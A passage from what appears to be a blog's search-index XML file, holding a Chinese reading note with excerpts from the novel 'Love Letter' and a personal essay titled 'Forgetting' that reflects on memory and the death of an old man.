好吗？我很好”足以无声消融一切。我们终于不再贪恋，不再妒忌，不再感伤，而是相互拥抱，渡过这冰冷的寂寞河流，杀死这刺骨的孤独时光。</p><p>这书短的离奇，看上去停的有些不是时候。我都怀疑自己是不是找到了不全的，可是转念想想，很多事不都这样，在最以为要高潮迭起的时候戛然而止，在最应当细水长流的时候无声湮灭，也许要抱怨生活，也许生活也会无辜地摊开双手，说，你瞧，我什么也没做，都是你们在作啊。</p><p>2015.11.18<br>附上摘抄:<br>《情书》摘抄<br>1.我不知道为什么他这样做，他大概是个闷蛋，无所事事。</p><p>2.她的经历，虽然当时很不愉快，十年后看来，很有趣。</p><p>3.”他跌下去后，我尽全力去找他。”熊山开始高歌：”我的爱随南风而逝……””这是你们攀山者常唱的歌？”博子问。这是松田圣子的歌。”我相信当阿树敞在石下时还唱着这首歌。我听得到。”熊山说。 “也许阿树当时只是想着松田圣子。”博子耸一耸肩。博子和茂决定在熊山的家过夜。</p><p>4.妈很愤怒。”你还记得我丈夫怎死的？他患肺炎，那是冬天，是你背他到医院的。太迟了，上次你用了45分钟。我们要等救护车。””我只用了30分钟。”爷爷坚持：”事实上只28分钟，便到了入口。我今晚会再做得到。”当爷爷背起树时，妈挡着门口。”看，阿树是你的女儿，今晚由你决定。你选择怎做？”她知道怎么也阻不了他，所以决定让爷爷去了。风雪越下越大，爷爷背着树，踏过厚雪。他已是七十五岁了，但还很强健。半路中途，他摔倒了，面庞直倒在雪上。”你要休息一下了。”妈说。”不！我们继续！”他们花了四十分钟赶到医院，爷爷明显也要医治。医生给他一点氧气。阿树则暂时脱离危险。</p><p>5.茂走前几步用手围着嘴巴，叫声响遍冬日早晨：”藤井树，你‥冷‥吗？你还‥唱着‥松田圣子的歌吗？我要‥跟博子‥结婚呀！好‥好‥好！”他回头看博子。”看见吗？阿树祝福我们！”博子微笑。她想着对阿树说什么。面对着雪山，她大叫：”阿树，你好吗？我很好‥”不知什么缘故，在病榻上的阿树似听见博子，并轻轻唤道：”我很好。””阿树！你‥好‥吗？我‥很‥好！”博子跪在雪上，控制不了。第一次，她感到自在，她可以让阿树离开了。</p><p>6.当我在那个星期后回到学校，人们说你的阿树已经一声不响的转了校。那次就是我最后听见他的消息。</p><p>7.阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。</p><p>8.那本书，叫做《回忆似水年华》</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>遗忘</title>
      <link href="/mind/141123WhyForget/"/>
      <url>/mind/141123WhyForget/</url>
      
        <content type="html"><![CDATA[<h4 id="遗忘"><a href="#遗忘" class="headerlink" title="遗忘"></a>遗忘</h4><p>我叫李忘，今年十八。在人们看来我是一个很糟糕的家伙，因为我总记不起昨日的承诺和明天的约定，记不起前夜的聚会和狂欢，也记不起信誓旦旦高谈阔论着的梦想与追逐。常人也会慢慢忘记很多东西，但我的遗忘功能似乎强大得多，相比之下，我更彻底地失去过去，以及那总想不起方向的未来。“无妨，不是还有现在吗？人们不是说把握现在比追忆过去和追逐未来更切实重要吗？”我常常这样安慰自己，又常常在安慰过后遗忘，继续像头猪一样在生活的泥沼中哼哼地打滚。</p><p>我想我可能是上帝的实验品。一般人一定想不起上个月或是去年今天那个早上穿的鞋是什么颜色的，但我则想不起昨天的这个时辰女友的声嘶力竭和泛红的眼眶是为了什么，也想不起早上看励志电影时从心底深处涌起的那股渴望与为梦想奋战的决心和激情。我是麻木的。我所追忆和留恋的绝非是甜蜜的爱情和闪光的理想，而是昨天在堕入时光之渊后留下的黑暗与茫然，以及这份茫然给予的无限酸涩；我所追逐与向往的也绝非是巅峰的事业与耀眼的光荣，而是明天在可悲地变成昨天之后我无法重拾的那份朦胧，以及随之而来的哀伤和祭奠。</p><p>我的每一个日子都是朝生暮死，我靠着生存惯性安然地活过了十八年。然而就在去年，我的惯性受到了撼动。死亡第一次接近我，我开始不得不直视它，认真地分析和评估它的力量。枯瘦如柴的老人斜斜地横在木板堆叠成的简易床铺上，上下眼皮被厚厚的眼屎相连，几乎看不见眼珠，我只是在眼角看到隐约闪烁的泪光。昏黄的灯下，孤陋的乡野，肆虐的风雨，哭嚎着的天地，老人就在这里，平静地结束了过去，也同时结束了现在和将来一切关于他的可能性。亲朋们远远地坐在厅堂里，各自神情冷漠，肃穆无言，只有我在床榻旁握着老人的手，直至最后一刻。感受着热量一点点离开这个生灵，我又想起了他惨淡而又执着的一生，他曾经苦苦追求的，难道就是这个结局，我真的不敢相信。擦干眼角，我木然地离开了房间，轻轻地说了句“走了”。一瞬间，惊愕，恐惧，茫然，释怀以及各种难以名状的情绪涌上每一个人的脸庞，但是更多的还是麻木，麻木，麻木，令我心痛而又无可奈何的麻木。然后，大家开始了早已准备停当的后续工作。而懦弱的我无法接受这一切，包括那已成俗礼的夸张的大哭。我裹着单衣，走进雨里，想陪他的灵魂最后一程。就此别了吧。从此以后，我们各自孤独，各自在各自的江湖里飘摇。只是，生者在流浪中老去，而死者，你永远年轻！</p><p>我本以为自己能将所有的记忆像压低了声儿放屁一样悄悄搁置在我坐过的地方，然后了让它慢慢逸散开来，与天地相合，即使再尴尬地闻到也已与我无关，甚至可以捏着鼻子，摆出一副嫌恶的表情，自然地努努嘴叹一声“哎呀，真臭啊。”可是，那一幕始终在我的脑海里。一年多来，不管是学业还是人类引以为精神支柱的爱情，关于它们的一切我都可以迅速地遗忘。我在寻找着它们，它们也在寻找着我，只是我很清楚，我瞧不起它们，它们也瞧不起我。可是死亡不一样，我不找它，但它在找我，每天每时每刻进度条都在前进着，而且，必有那么一天，它会像水蛇一样柔柔地缠上我。然后在大脑一片空白时我陷入了永远的沉睡，不再醒来。那是比爱情更加销魂的毁灭，比成功更加诱人的沉沦。我想，有些时候，我真忍不住要歌颂你。</p><p>我终于清楚明白地了解了，那人们追忆着的昨日，和追逐的明天都不过是镜花水月，而我所追求的此刻的宁静和下一刻的彻底遗忘，才是生命最终的归宿，也是整个文明的最高依托。因为一切，都会涅没在黎明前最黑的黑暗里。对于破晓，我们那么接近，那么相信，但是不可能，不可能看到曙光。</p><p>我犹记得那个流浪在风雨里，为逝去的灵魂品尝泪水的夜里，我所看到的竹林。我想那摇曳的竹影和沙沙的哭声，便是所有生命最真实的写照和所有问题最终的答案。</p><p>谨此记2014年8月殁事。时2015年。</p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
